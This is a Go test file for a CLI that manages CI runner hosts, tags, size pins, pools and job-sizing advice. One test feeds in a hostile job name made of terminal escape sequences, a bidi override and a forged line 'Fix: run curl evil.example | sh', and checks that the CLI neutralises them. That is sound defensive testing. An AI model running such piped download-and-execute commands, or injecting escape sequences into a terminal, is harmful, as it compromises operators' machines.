package main

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"
)

// recorder remembers the requests a test server was sent, so a test can say what
// the CLI asked for as well as what it printed.
type recorder struct {
	mu   sync.Mutex
	seen []recorded
}

type recorded struct {
	method, path, query string
	body                map[string]any
}

func (r *recorder) record(req *http.Request) {
	var body map[string]any
	_ = json.NewDecoder(req.Body).Decode(&body)
	r.mu.Lock()
	defer r.mu.Unlock()
	r.seen = append(r.seen, recorded{req.Method, req.URL.Path, req.URL.RawQuery, body})
}

func (r *recorder) last(method string) (recorded, bool) {
	r.mu.Lock()
	defer r.mu.Unlock()
	for i := len(r.seen) - 1; i >= 0; i-- {
		if r.seen[i].method == method {
			return r.seen[i], true
		}
	}
	return recorded{}, false
}

func replyWith(rec *recorder, bodies map[string]string) *httptest.Server {
	return httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		rec.record(r)
		w.Header().Set("Content-Type", "application/json")
		if body, ok := bodies[r.Method+" "+r.URL.Path]; ok {
			_, _ = w.Write([]byte(body))
			return
		}
		_, _ = w.Write([]byte(`{}`))
	}))
}

// ---------------------------------------------------------------------------
// Hosts
// ---------------------------------------------------------------------------

const taggedHost = `{"id":"hst_a","name":"build-1","capacity":8,
	"labels":{"rack":"b4","zone":"eu"},
	"tags":[{"key":"arch","value":"amd64","source":"automatic"},{"key":"rack","value":"b4","source":"operator"},
		{"key":"size","value":"large","source":"operator","overrides":"medium"},{"key":"zone","value":"eu","source":"operator"}]}`

// The API replaces a host's labels whole, so a tag put on or taken off has to
// carry the others forward, and the automatic tags are the machine's and are
// never written back as labels.
func TestHostsEditCarriesTheOtherTagsForwardAndNeverWritesTheAutomaticOnes(t *testing.T) {
	rec := &recorder{}
	srv := replyWith(rec, map[string]string{"GET /api/v1/hosts/hst_a": taggedHost, "PATCH /api/v1/hosts/hst_a": taggedHost})
	defer srv.Close()

	e, out, errOut := newTestEnv(t)
	if code := dispatch(context.Background(), e, []string{"hosts", "edit", "hst_a", "--tag", "size=large", "--tag", "gpu", "--untag", "zone", "--url", srv.URL}); code != exitOK {
		t.Fatalf("exit code = %d\n%s", code, errOut)
	}
	patch, ok := rec.last(http.MethodPatch)
	if !ok {
		t.Fatal("no PATCH was sent")
	}
	labels, _ := patch.body["labels"].(map[string]any)
	if len(labels) != 3 || labels["rack"] != "b4" || labels["size"] != "large" || labels["gpu"] != "true" {
		t.Fatalf("the labels sent are %v; want rack kept, size and a bare gpu added, zone taken off", labels)
	}
	if _, automatic := labels["arch"]; automatic {
		t.Fatalf("an automatic tag was written back as a label: %v", labels)
	}
	if len(patch.body) != 1 {
		t.Errorf("the edit sent more than the labels: %v", patch.body)
	}
	if got := out.String() + errOut.String(); !strings.Contains(got, "Updated host build-1") || !strings.Contains(got, "size=large (its machine would be medium)") {
		t.Errorf("the summary does not say what the tags are:\n%s", got)
	}
}

func TestATagAndAnUntagOfTheSameKeyIsRefusedBeforeAnythingIsSent(t *testing.T) {
	rec := &recorder{}
	srv := replyWith(rec, nil)
	defer srv.Close()
	e, _, errOut := newTestEnv(t)
	code := dispatch(context.Background(), e, []string{"hosts", "edit", "hst_a", "--tag", "rack=b4", "--untag", "rack", "--url", srv.URL})
	if code != exitUsage || !strings.Contains(errOut.String(), "both name rack") {
		t.Fatalf("exit code %d\n%s", code, errOut)
	}
	if len(rec.seen) != 0 {
		t.Fatalf("a request was sent for a refused edit: %v", rec.seen)
	}
}

// A flag is one tag, and the flag is repeatable. Splitting on commas turned
// `--tag rack=b4,b5` into a rack called b4 and a tag called b5, which nobody who
// wrote it meant.
func TestATagFlagIsOneTagAndIsNotSplitOnCommas(t *testing.T) {
	rec := &recorder{}
	srv := replyWith(rec, map[string]string{"GET /api/v1/hosts/hst_a": taggedHost, "PATCH /api/v1/hosts/hst_a": taggedHost})
	defer srv.Close()
	e, _, errOut := newTestEnv(t)
	if code := dispatch(context.Background(), e, []string{"hosts", "edit", "hst_a", "--tag", "rack=b4,b5", "--url", srv.URL}); code != exitOK {
		t.Fatalf("exit code = %d\n%s", code, errOut)
	}
	patch, _ := rec.last(http.MethodPatch)
	labels, _ := patch.body["labels"].(map[string]any)
	if labels["rack"] != "b4,b5" || len(labels) != 2 {
		t.Fatalf("the labels sent are %v; want rack to be \"b4,b5\" and nothing else added", labels)
	}
}

// Taking off a tag that is not there, or one the machine's own, would succeed and
// change nothing, which reads as a tag taken off that is still on the host.
func TestUntagSaysWhenThereIsNothingToTakeOff(t *testing.T) {
	for _, tc := range []struct {
		name string
		args []string
		want string
	}{
		{"a value", []string{"--untag", "rack=b4"}, "--untag takes a tag's name, written without a value: --untag rack"},
		{"a tag the host does not have", []string{"--untag", "rak"}, "cannot take off rak: it has no tag of that name"},
		{"a tag the machine works out", []string{"--untag", "arch"}, "cannot take off arch: that one is worked out from the machine"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			rec := &recorder{}
			srv := replyWith(rec, map[string]string{"GET /api/v1/hosts/hst_a": taggedHost})
			defer srv.Close()
			e, _, errOut := newTestEnv(t)
			code := dispatch(context.Background(), e, append([]string{"hosts", "edit", "hst_a"}, append(tc.args, "--url", srv.URL)...))
			if code != exitUsage || !strings.Contains(errOut.String(), tc.want) {
				t.Fatalf("exit code %d\n%s\nwant %q", code, errOut, tc.want)
			}
			if _, sent := rec.last(http.MethodPatch); sent {
				t.Fatal("a PATCH was sent for an edit that changes nothing")
			}
		})
	}
}

func TestATagThatIsNotOneIsRefused(t *testing.T) {
	rec := &recorder{}
	srv := replyWith(rec, nil)
	defer srv.Close()
	e, _, errOut := newTestEnv(t)
	if code := dispatch(context.Background(), e, []string{"hosts", "edit", "hst_a", "--tag", "=x", "--url", srv.URL}); code != exitUsage || !strings.Contains(errOut.String(), "key=value") {
		t.Fatalf("exit code %d\n%s", code, errOut)
	}
}

func TestHostsListSaysTheClassTheTagsAndAnyPoolAHostIsNotIn(t *testing.T) {
	rec := &recorder{}
	srv := replyWith(rec, map[string]string{"GET /api/v1/hosts": `{"items":[
	  {"id":"hst_a","name":"build-1","capacity":8,"active_runners":0,"free":8,"effective_capacity":8,"backends":["docker"],"healthy":true,
	   "cpus":12,"memory_mb":32768,"last_heartbeat":"2026-01-01T00:00:00Z",
	   "size_class":{"class":"large","source":"tag","measured":"medium","reason":"x"},
	   "tags":[{"key":"rack","value":"b4","source":"operator"},{"key":"size","value":"large","source":"operator","overrides":"medium"},{"key":"os","value":"linux","source":"automatic"}],
	   "auto_pool":{"counted":true,"pool":"zoomies-large"}},
	  {"id":"hst_b","name":"tiny-1","capacity":4,"active_runners":0,"free":4,"effective_capacity":4,"backends":["docker"],"healthy":true,
	   "cpus":4,"memory_mb":16384,"last_heartbeat":"2026-01-01T00:00:00Z",
	   "size_class":{"class":"small","source":"measured","reason":"y"},"tags":[],
	   "auto_pool":{"counted":false,"reason":"It is cordoned, so its slots do not count towards an automatic pool until it is uncordoned.","reason_code":"cordoned"}}
	]}`})
	defer srv.Close()

	e, out, errOut := newTestEnv(t)
	if code := dispatch(context.Background(), e, []string{"hosts", "list", "--url", srv.URL}); code != exitOK {
		t.Fatalf("exit code = %d\n%s", code, errOut)
	}
	got := out.String() + errOut.String()
	for _, want := range []string{
		"12 vCPU, 32 GB (large, by tag)", "4 vCPU, 16 GB (small)",
		"build-1 tags: rack=b4, size=large (its machine would be medium)",
		"tiny-1 counts towards no automatic pool. It is cordoned",
	} {
		if !strings.Contains(got, want) {
			t.Errorf("output does not contain %q:\n%s", want, got)
		}
	}
	if strings.Contains(got, "os=linux") {
		t.Errorf("an automatic tag was listed as the operator's:\n%s", got)
	}
}

// A controller that has never heard of size classes sends none of it, and the
// table is as it always was.
func TestHostsListIsUnchangedForAControllerThatSendsNoClasses(t *testing.T) {
	rec := &recorder{}
	srv := replyWith(rec, map[string]string{"GET /api/v1/hosts": `{"items":[
	  {"id":"hst_a","name":"old","capacity":4,"active_runners":1,"free":3,"effective_capacity":4,"backends":["docker"],"healthy":true,
	   "cpus":8,"memory_mb":16384,"last_heartbeat":"2026-01-01T00:00:00Z"}]}`})
	defer srv.Close()
	e, out, errOut := newTestEnv(t)
	if code := dispatch(context.Background(), e, []string{"hosts", "list", "--url", srv.URL}); code != exitOK {
		t.Fatalf("exit code = %d\n%s", code, errOut)
	}
	got := out.String() + errOut.String()
	if !strings.Contains(got, "8 vCPU, 16 GB") || strings.Contains(got, "tags:") || strings.Contains(got, "automatic pool") {
		t.Fatalf("output:\n%s", got)
	}
}

// ---------------------------------------------------------------------------
// Pins
// ---------------------------------------------------------------------------

func TestSizePinsSetListAndDelete(t *testing.T) {
	rec := &recorder{}
	srv := replyWith(rec, map[string]string{
		"PUT /api/v1/size-pins": `{"pin":{"repo":"acme/widgets","class":"large","created_by":"operator"},"reclassified":2}`,
		"GET /api/v1/size-pins": `{"items":[
		  {"repo":"acme/widgets","class":"large","created_by":"operator","created_at":"2026-01-01T00:00:00Z"},
		  {"repo":"acme/api","workflow":"CI","job_name":"build","class":"small","created_at":"2026-01-01T00:00:00Z"}]}`,
		"DELETE /api/v1/size-pins": `{"reclassified":1}`,
	})
	defer srv.Close()

	e, out, errOut := newTestEnv(t)
	if code := dispatch(context.Background(), e, []string{"size-pins", "set", "acme/widgets", "--class", "large", "--url", srv.URL}); code != exitOK {
		t.Fatalf("set: exit code = %d\n%s", code, errOut)
	}
	put, _ := rec.last(http.MethodPut)
	if put.body["repo"] != "acme/widgets" || put.body["class"] != "large" || put.body["workflow"] != "" {
		t.Fatalf("the PUT body is %v", put.body)
	}
	if got := out.String() + errOut.String(); !strings.Contains(got, "Pinned every job in acme/widgets to large.") || !strings.Contains(got, "2 jobs already waiting moved to it.") {
		t.Errorf("set printed:\n%s", got)
	}

	e, out, errOut = newTestEnv(t)
	if code := dispatch(context.Background(), e, []string{"size-pins", "list", "--url", srv.URL}); code != exitOK {
		t.Fatalf("list: exit code = %d\n%s", code, errOut)
	}
	got := out.String()
	for _, want := range []string{"acme/widgets", "every job", "CI / build", "small"} {
		if !strings.Contains(got, want) {
			t.Errorf("list does not contain %q:\n%s", want, got)
		}
	}

	e, out, errOut = newTestEnv(t)
	if code := dispatch(context.Background(), e, []string{"size-pins", "delete", "acme/api", "--workflow", "CI", "--job", "build", "--url", srv.URL}); code != exitOK {
		t.Fatalf("delete: exit code = %d\n%s", code, errOut)
	}
	del, _ := rec.last(http.MethodDelete)
	if !strings.Contains(del.query, "repo=acme%2Fapi") || !strings.Contains(del.query, "workflow=CI") || !strings.Contains(del.query, "job_name=build") {
		t.Fatalf("the DELETE query is %q", del.query)
	}
	if !strings.Contains(out.String(), "1 job already waiting went back") {
		t.Errorf("delete printed:\n%s", out)
	}
}

func TestSizePinsSetNeedsAClass(t *testing.T) {
	e, _, errOut := newTestEnv(t)
	if code := dispatch(context.Background(), e, []string{"size-pins", "set", "acme/widgets", "--url", "http://127.0.0.1:1"}); code != exitUsage || !strings.Contains(errOut.String(), "--class") {
		t.Fatalf("exit code %d\n%s", code, errOut)
	}
}

// ---------------------------------------------------------------------------
// Automatic pools
// ---------------------------------------------------------------------------

func TestAutoPoolsSaysWhatTheControllerKeepsAndWhatItCouldNotDo(t *testing.T) {
	rec := &recorder{}
	srv := replyWith(rec, map[string]string{"GET /api/v1/auto-pools": `{
	  "size_routing":"on","auto_pools":"shadow","installation":"acme","default_class":"medium",
	  "pools":[{"key":"amd64/medium","name":"zoomies-medium","pool_id":"pool_a","hosts":["build-1","build-2"],"slots":10}],
	  "findings":[{"message":"pool mine already answers to zoomies-large","fix":"take zoomies-large off pool mine."}],
	  "skipped":[{"host":"tiny-1","message":"It is cordoned."}],
	  "pending":[{"kind":"create","pool":"zoomies-large","cause":"no pool existed for large x64 hosts"}],
	  "classes":[{"class":"small","label":"zoomies-small","host_max_cpus":4,"host_max_memory_mb":16384,"runner_cpus":1,"runner_memory_mb":2048},
	             {"class":"large","label":"zoomies-large","runner_cpus":4,"runner_memory_mb":8192}]}`})
	defer srv.Close()

	e, out, errOut := newTestEnv(t)
	if code := dispatch(context.Background(), e, []string{"auto-pools", "--url", srv.URL}); code != exitOK {
		t.Fatalf("exit code = %d\n%s", code, errOut)
	}
	got := out.String() + errOut.String()
	for _, want := range []string{
		"size routing", "on", "shadow", "acme",
		"zoomies-small", "up to 4 CPUs, 16 GB", "1 CPUs, 2 GB", "any larger",
		"zoomies-medium", "build-1, build-2", "10 slots",
		"tiny-1: It is cordoned.",
		"pool mine already answers to zoomies-large", "Fix: take zoomies-large off pool mine.",
		"would create zoomies-large: no pool existed for large x64 hosts",
	} {
		if !strings.Contains(got, want) {
			t.Errorf("output does not contain %q:\n%s", want, got)
		}
	}
}

func TestAutoPoolsIsQuietAboutAFleetThatHasNotTurnedItOn(t *testing.T) {
	rec := &recorder{}
	srv := replyWith(rec, map[string]string{"GET /api/v1/auto-pools": `{"size_routing":"off","auto_pools":"off","pools":[],"findings":[],"skipped":[],"pending":[],"classes":[],"default_class":"medium"}`})
	defer srv.Close()
	e, out, errOut := newTestEnv(t)
	if code := dispatch(context.Background(), e, []string{"auto-pools", "--url", srv.URL}); code != exitOK {
		t.Fatalf("exit code = %d\n%s", code, errOut)
	}
	got := out.String() + errOut.String()
	if !strings.Contains(got, "Both are off") || !strings.Contains(got, "shadow") || strings.Contains(got, "runs-on label") {
		t.Fatalf("output:\n%s", got)
	}
}

// ---------------------------------------------------------------------------
// Pools
// ---------------------------------------------------------------------------

func TestPoolsEditAsksForWarmRunnersAndACapOnAPoolTheControllerKeeps(t *testing.T) {
	rec := &recorder{}
	srv := replyWith(rec, map[string]string{"PATCH /api/v1/pools/pool_a": `{"id":"pool_a","name":"zoomies-medium"}`})
	defer srv.Close()
	e, _, errOut := newTestEnv(t)
	if code := dispatch(context.Background(), e, []string{"pools", "edit", "pool_a", "--warm", "2", "--cap", "6", "--url", srv.URL}); code != exitOK {
		t.Fatalf("exit code = %d\n%s", code, errOut)
	}
	patch, _ := rec.last(http.MethodPatch)
	auto, _ := patch.body["auto"].(map[string]any)
	if auto["warm"] != 2.0 || auto["cap"] != 6.0 || len(patch.body) != 1 {
		t.Fatalf("the PATCH body is %v", patch.body)
	}

	// Zero is something to say: no cap.
	if code := dispatch(context.Background(), e, []string{"pools", "edit", "pool_a", "--cap", "0", "--url", srv.URL}); code != exitOK {
		t.Fatalf("exit code = %d\n%s", code, errOut)
	}
	patch, _ = rec.last(http.MethodPatch)
	if auto, _ := patch.body["auto"].(map[string]any); auto["cap"] != 0.0 || len(auto) != 1 {
		t.Fatalf("the PATCH body is %v", patch.body)
	}
}

func TestPoolsGetSaysItIsKeptByTheControllerAndWhatWasAskedOfIt(t *testing.T) {
	rec := &recorder{}
	srv := replyWith(rec, map[string]string{"GET /api/v1/pools/pool_a": `{"id":"pool_a","name":"zoomies-medium","enabled":true,"labels":["zoomies"],
	  "auto":{"key":"amd64/medium","arch":"amd64","class":"medium","warm":1,"cap":3,"paused":false,"hosts":["build-1"],"slots":5,
	  "summary":"Kept by the controller for medium x64 hosts: 1 host (build-1) hold 5 runners between them. You capped it at 3 runners."}}`})
	defer srv.Close()
	e, out, errOut := newTestEnv(t)
	if code := dispatch(context.Background(), e, []string{"pools", "get", "pool_a", "--url", srv.URL}); code != exitOK {
		t.Fatalf("exit code = %d\n%s", code, errOut)
	}
	got := out.String()
	for _, want := range []string{"kept by the controller", "1 host (build-1) hold 5 runners", "asked of it", "1 runner kept warm, at most 3 runners"} {
		if !strings.Contains(got, want) {
			t.Errorf("output does not contain %q:\n%s", want, got)
		}
	}
}

func TestPoolsListSaysWhyAPoolTheControllerKeepsIsOutOfUse(t *testing.T) {
	rec := &recorder{}
	srv := replyWith(rec, map[string]string{"GET /api/v1/pools": `{"items":[
	  {"id":"pool_a","name":"zoomies-medium","enabled":false,"labels":["zoomies"],"counts":{},"auto":{"key":"amd64/medium","paused":true}},
	  {"id":"pool_b","name":"zoomies-large","enabled":false,"labels":["zoomies"],"counts":{},"auto":{"key":"amd64/large","paused":false}},
	  {"id":"pool_c","name":"mine","enabled":false,"labels":["mine"],"counts":{}}]}`})
	defer srv.Close()
	e, out, errOut := newTestEnv(t)
	if code := dispatch(context.Background(), e, []string{"pools", "list", "--url", srv.URL}); code != exitOK {
		t.Fatalf("exit code = %d\n%s", code, errOut)
	}
	got := out.String()
	if !strings.Contains(got, "paused") || !strings.Contains(got, "no hosts") {
		t.Fatalf("the list does not say why the two are out of use:\n%s", got)
	}
}

// ---------------------------------------------------------------------------
// Jobs
// ---------------------------------------------------------------------------

func TestJobsAdviceListsWhatToChangeAndWhatToWrite(t *testing.T) {
	rec := &recorder{}
	srv := replyWith(rec, map[string]string{"GET /api/v1/label-advice": `{"total":2,"limit":20,"offset":0,"counts":{"too_small":1,"unguaranteed":1,"too_large":0},"items":[
	  {"repo":"acme/widgets","workflow":"CI","job_name":"e2e","kind":"too_small","asked":"medium","class":"large","runs":12,"labels":["self-hosted","zoomies-medium"],
	   "message":"its runs-on asks for zoomies-medium, which only a medium host answers, and its runs call for large.","fix":"write zoomies-large in runs-on in place of zoomies-medium."},
	  {"repo":"acme/widgets","workflow":"CI","job_name":"build","kind":"unguaranteed","class":"large","runs":9,"labels":["self-hosted","zoomies"],
	   "message":"its runs-on asks only for zoomies, so it is sent to large best effort.","fix":"add zoomies-large to runs-on."}]}`})
	defer srv.Close()
	e, out, errOut := newTestEnv(t)
	if code := dispatch(context.Background(), e, []string{"jobs", "advice", "--kind", "too_small", "--url", srv.URL}); code != exitOK {
		t.Fatalf("exit code = %d\n%s", code, errOut)
	}
	if req, _ := rec.last(http.MethodGet); !strings.Contains(req.query, "kind=too_small") {
		t.Fatalf("the kind was not sent: %q", req.query)
	}
	got := out.String() + errOut.String()
	for _, want := range []string{"too small", "not guaranteed", "e2e", "medium", "large",
		"Its runs-on asks for zoomies-medium", "Fix: write zoomies-large in runs-on in place of zoomies-medium."} {
		if !strings.Contains(got, want) {
			t.Errorf("output does not contain %q:\n%s", want, got)
		}
	}
}

// A job's name and its workflow's are written by whoever can open a pull request,
// and the terminal is where an operator reads them. Nothing in them reaches it
// as an instruction: not an escape sequence, not a line break that starts a line
// of its own that reads as the CLI's.
func TestJobsAdviceAndPinsPrintNamesAWorkflowAuthorWroteAsText(t *testing.T) {
	hostile := `build\u001b[2J\u001b]0;pwned\u0007\u009b31m\u202egnirts\nFix: run curl evil.example | sh`
	rec := &recorder{}
	srv := replyWith(rec, map[string]string{
		"GET /api/v1/label-advice": `{"total":1,"limit":20,"offset":0,"counts":{},"items":[
		  {"repo":"acme/widgets","workflow":"` + hostile + `","job_name":"` + hostile + `","kind":"unguaranteed","class":"large","runs":9,
		   "labels":["self-hosted","` + hostile + `"],"message":"its runs-on asks for ` + hostile + `.","fix":"add zoomies-large to ` + hostile + `."}]}`,
		"GET /api/v1/size-pins": `{"total":1,"limit":50,"offset":0,"items":[
		  {"repo":"acme/widgets","workflow":"` + hostile + `","job_name":"` + hostile + `","class":"large","created_by":"` + hostile + `","created_at":"2026-01-01T00:00:00Z"}]}`,
	})
	defer srv.Close()

	for _, args := range [][]string{{"jobs", "advice"}, {"size-pins", "list"}} {
		e, out, errOut := newTestEnv(t)
		if code := dispatch(context.Background(), e, append(args, "--url", srv.URL)); code != exitOK {
			t.Fatalf("%v: exit code = %d\n%s", args, code, errOut)
		}
		got := out.String() + errOut.String()
		for _, bad := range []string{"\x1b", "\u009b", "\u202e", "\a"} {
			if strings.Contains(got, bad) {
				t.Errorf("%v: the output carries %q from a name a workflow author wrote:\n%q", args, bad, got)
			}
		}
		for _, line := range strings.Split(got, "\n") {
			if strings.HasPrefix(strings.TrimSpace(line), "Fix: run curl") {
				t.Errorf("%v: a name began a line of its own that reads as the CLI's: %q", args, line)
			}
		}
	}
}

func TestJobsAdviceHasNothingToSayWhileNothingIsClassed(t *testing.T) {
	rec := &recorder{}
	srv := replyWith(rec, map[string]string{"GET /api/v1/label-advice": `{"total":0,"limit":20,"offset":0,"counts":{},"items":[]}`})
	defer srv.Close()
	e, out, errOut := newTestEnv(t)
	if code := dispatch(context.Background(), e, []string{"jobs", "advice", "--url", srv.URL}); code != exitOK {
		t.Fatalf("exit code = %d\n%s", code, errOut)
	}
	if got := out.String() + errOut.String(); !strings.Contains(got, "Nothing to change") {
		t.Fatalf("output:\n%s", got)
	}
}

func TestJobsGetSaysHowAJobWasClassedWhereItWentAndWhereItRan(t *testing.T) {
	rec := &recorder{}
	srv := replyWith(rec, map[string]string{
		"GET /api/v1/jobs/job_a": `{"id":"job_a","repo":"acme/widgets","workflow":"CI","job_name":"build","state":"completed","conclusion":"success",
		  "size_class":"large","size_basis":"history","size_reason":"its memory needs about 6.2 GB, which a large runner holds",
		  "routed_class":"large","ran_class":"medium","throttled_share":0.4,"queued_at":"2026-01-01T00:00:00Z"}`,
	})
	defer srv.Close()
	e, out, errOut := newTestEnv(t)
	if code := dispatch(context.Background(), e, []string{"jobs", "get", "job_a", "--url", srv.URL}); code != exitOK {
		t.Fatalf("exit code = %d\n%s", code, errOut)
	}
	got := out.String()
	for _, want := range []string{
		"size class", "large (its memory needs about 6.2 GB, which a large runner holds)",
		"routed to", "large, best effort: GitHub decides which waiting job a runner takes",
		"ran on", "medium (not the class it was put in)",
		"held back by its CPU limit", "40% of the time",
	} {
		if !strings.Contains(got, want) {
			t.Errorf("output does not contain %q:\n%s", want, got)
		}
	}

	// A job nobody classed has none of those rows.
	srv2 := replyWith(rec, map[string]string{"GET /api/v1/jobs/job_b": `{"id":"job_b","repo":"acme/widgets","state":"queued","queued_at":"2026-01-01T00:00:00Z"}`})
	defer srv2.Close()
	e, out, errOut = newTestEnv(t)
	if code := dispatch(context.Background(), e, []string{"jobs", "get", "job_b", "--url", srv2.URL}); code != exitOK {
		t.Fatalf("exit code = %d\n%s", code, errOut)
	}
	if strings.Contains(out.String(), "size class") || strings.Contains(out.String(), "routed to") {
		t.Fatalf("a job nobody classed has size rows:\n%s", out)
	}
}

const adviceWithFigures = `{"total":2,"limit":20,"offset":0,"counts":{"too_small":1,"unguaranteed":0,"too_large":0,"not_enough_data":1},
  "window":{"asked":"336h0m0s","applied":"168h0m0s","bound":"retention"},"items":[
  {"repo":"acme/widgets","workflow":"CI","job_name":"e2e","kind":"too_small","state":"ok","min_runs":5,"asked":"medium","class":"large",
   "recommended_class":"large","reason":"its memory needs about 6.2 GB","runs":12,"labels":["self-hosted","zoomies-medium"],
   "message":"its runs-on asks for zoomies-medium, and its runs call for large.","fix":"write zoomies-large in runs-on in place of zoomies-medium.",
   "observed":{"runs":12,"cpu":{"p50":1,"p95":1.5,"max":2},"memory_mb":{"p50":5200,"p95":6000,"max":7100}},"fits":{"ok":false,"missing":"large"}},
  {"repo":"acme/widgets","workflow":"CI","job_name":"new","kind":"","state":"not_enough_data","min_runs":5,"class":"large",
   "recommended_class":"large","reason":"its memory needs about 6.2 GB","runs":2,"labels":["self-hosted","zoomies-medium"],
   "message":"2 of 5 measured runs so far; advice needs 5.","fix":"",
   "observed":{"runs":2,"cpu":{"p50":0,"p95":0,"max":0},"memory_mb":{"p50":1000,"p95":1000,"max":1000}},"fits":{"ok":true}}]}`

// A row is only as good as the figures a reader can check it against, so the
// table carries them: the p95 and the most any run used, how many runs in the
// window, and whether the fleet has a host of the class at all.
func TestJobsAdviceShowsTheFiguresBehindEachRow(t *testing.T) {
	rec := &recorder{}
	srv := replyWith(rec, map[string]string{"GET /api/v1/label-advice": adviceWithFigures})
	defer srv.Close()
	e, out, errOut := newTestEnv(t)
	if code := dispatch(context.Background(), e, []string{"jobs", "advice", "--url", srv.URL}); code != exitOK {
		t.Fatalf("exit code = %d\n%s", code, errOut)
	}
	got := out.String() + errOut.String()
	for _, want := range []string{"P95 MEMORY", "6000 MB", "7100 MB", "1.5", "12",
		"No host in this fleet is large", "over the last 7 days", "bounded by retention"} {
		if !strings.Contains(got, want) {
			t.Errorf("output does not contain %q:\n%s", want, got)
		}
	}
}

func TestJobsAdviceSendsTheWindowAndRepository(t *testing.T) {
	rec := &recorder{}
	srv := replyWith(rec, map[string]string{"GET /api/v1/label-advice": adviceWithFigures})
	defer srv.Close()
	e, _, errOut := newTestEnv(t)
	if code := dispatch(context.Background(), e, []string{"jobs", "advice", "--window", "7d", "--repo", "acme/widgets", "--url", srv.URL}); code != exitOK {
		t.Fatalf("exit code = %d\n%s", code, errOut)
	}
	req, _ := rec.last(http.MethodGet)
	for _, want := range []string{"window=7d", "repo=acme%2Fwidgets"} {
		if !strings.Contains(req.query, want) {
			t.Errorf("the query %q does not carry %q", req.query, want)
		}
	}
}

// A job with too few runs is a row that says how far it is from being advised
// on, taking the minimum from the payload, and a figure no run measured is a
// dash and never 0.00.
func TestJobsAdvicePrintsASparseRowAsNotEnoughData(t *testing.T) {
	rec := &recorder{}
	srv := replyWith(rec, map[string]string{"GET /api/v1/label-advice": adviceWithFigures})
	defer srv.Close()
	e, out, errOut := newTestEnv(t)
	if code := dispatch(context.Background(), e, []string{"jobs", "advice", "--url", srv.URL}); code != exitOK {
		t.Fatalf("exit code = %d\n%s", code, errOut)
	}
	got := out.String() + errOut.String()
	if !strings.Contains(got, "not enough data yet, 2 of 5 runs") {
		t.Errorf("the sparse row is not said:\n%s", got)
	}
	for _, line := range strings.Split(got, "\n") {
		if strings.Contains(line, "/ new") || strings.Contains(line, "not enough") {
			if strings.Contains(line, "0.00") || strings.Contains(line, " 0 ") {
				t.Errorf("a figure no run measured prints as zero: %q", line)
			}
		}
	}
}

func TestJobsAdviceRefusesAWindowItCannotRead(t *testing.T) {
	e, _, errOut := newTestEnv(t)
	if code := dispatch(context.Background(), e, []string{"jobs", "advice", "--window", "soon", "--url", "http://127.0.0.1:1"}); code != exitUsage {
		t.Fatalf("exit code = %d, want %d\n%s", code, exitUsage, errOut)
	}
	if !strings.Contains(errOut.String(), "window") {
		t.Fatalf("the error does not name the flag: %s", errOut)
	}
}
